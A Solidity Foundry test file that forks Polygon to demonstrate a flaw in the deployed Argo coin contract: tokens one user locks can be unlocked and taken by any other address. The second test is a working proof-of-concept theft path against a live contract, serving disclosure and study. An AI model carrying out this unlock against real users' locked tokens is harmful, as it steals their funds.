// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

/**
 * https://x.com/lordx64/status/1828500025078673597
 * 
 * lordx64 noted that the Argo coin smart contract has lock() and unlock()
 * functions. If a user was to lock() some tokens, another user can steal
 * them.
 * 
 * forge test --match-contract ArgoCoinTest -vvvv --evm-version shanghai
 */
contract ArgoCoinTest is Test {

    IARGOCOIN ARGOCOIN_TOKEN_CONTRACT = IARGOCOIN(0x2Ad2934d5BFB7912304754479Dd1f096D5C807Da);

    address ALICE = vm.addr(1);
    address BOB = vm.addr(2);

    function setUp() public {
        // Fork Polygon network (the block after the ArgoCoin was deployed)
        vm.createSelectFork("https://polygon.gateway.tenderly.co", 51_334_444);
        vm.label(ALICE, "User_Alice");
        vm.label(BOB, "User_Bob");
    }

    /**
     * Alice starts with 1e18 tokens, then calls lock() on the token contract. This
     * will send an amount of tokens (from her wallet/custody/address) to the token
     * smart contract address.
     * 
     * In a subsequent call, alice calls unlock() and recovers her tokens.
     * 
     * $ forge test --match-contract ArgoCoinTest --match-test test_userLocksTokensThenUnlocks -vvvv --evm-version shanghai
     */
    function test_userLocksTokensThenUnlocks() public {
        // Give alice 1e18 tokens
        deal(address(ARGOCOIN_TOKEN_CONTRACT), ALICE, 1 ether);
        assertEq(ARGOCOIN_TOKEN_CONTRACT.balanceOf(ALICE), 1 ether, "Alice does not have desired tokens");

        // As alice, we lock all our tokens
        vm.prank(ALICE, ALICE);
        ARGOCOIN_TOKEN_CONTRACT.lock(ALICE, 1 ether);

        // Ensure alice now has 0 tokens
        assertEq(ARGOCOIN_TOKEN_CONTRACT.balanceOf(ALICE), 0, "Alice should have zero tokens");

        // As alice, we unlock our tokens
        vm.prank(ALICE, ALICE);
        ARGOCOIN_TOKEN_CONTRACT.unlock(ALICE, 1 ether);

        // Ensure alice now has 1e18 tokens
        assertEq(ARGOCOIN_TOKEN_CONTRACT.balanceOf(ALICE), 1 ether, "Alice should have 1e18 tokens");
    }

    /**
     * Alice starts with 1e18 tokens, then calls lock() on the token contract. This
     * will send an amount of tokens (from her wallet/custody/address) to the token
     * smart contract address.
     * 
     * In a subsequent call, bob calls unlock() and recovers alice's tokens. This
     * happens because lock()/unlock() does not track who locked an amount of tokens.
     * 
     * Conclusion: any call to lock() with a number of a tokens is vulnerable to being
     * stolen by anyone else.
     * 
     * $ forge test --match-contract ArgoCoinTest --match-test test_userLocksTokensAnotherUserUnlocksThem -vvvv --evm-version shanghai
     */
    function test_userLocksTokensAnotherUserUnlocksThem() public {
        // Give alice 1e18 tokens
        deal(address(ARGOCOIN_TOKEN_CONTRACT), ALICE, 1 ether);
        assertEq(ARGOCOIN_TOKEN_CONTRACT.balanceOf(ALICE), 1 ether, "Alice does not have desired tokens");
        assertEq(ARGOCOIN_TOKEN_CONTRACT.balanceOf(BOB), 0, "Bob should have 0 tokens");

        // As alice, we lock all our tokens
        vm.prank(ALICE, ALICE);
        ARGOCOIN_TOKEN_CONTRACT.lock(ALICE, 1 ether);

        // Ensure alice now has 0 tokens
        assertEq(ARGOCOIN_TOKEN_CONTRACT.balanceOf(ALICE), 0, "Alice should have zero tokens");

        // As Bob, we unlock alice's tokens
        vm.prank(BOB, BOB);
        ARGOCOIN_TOKEN_CONTRACT.unlock(BOB, 1 ether);

        // Ensure alice still has 0 tokens
        assertEq(ARGOCOIN_TOKEN_CONTRACT.balanceOf(ALICE), 0, "Alice should have 0 tokens");
        // Ensure bob now has 1e18 tokens
        assertEq(ARGOCOIN_TOKEN_CONTRACT.balanceOf(BOB), 1 ether, "Bob should have 1e18 tokens");
    }
}
interface IARGOCOIN {
    function lock(address account, uint256 amount) external;
    function unlock(address account, uint256 amount) external;

    function balanceOf(address account) external view returns (uint256);
}
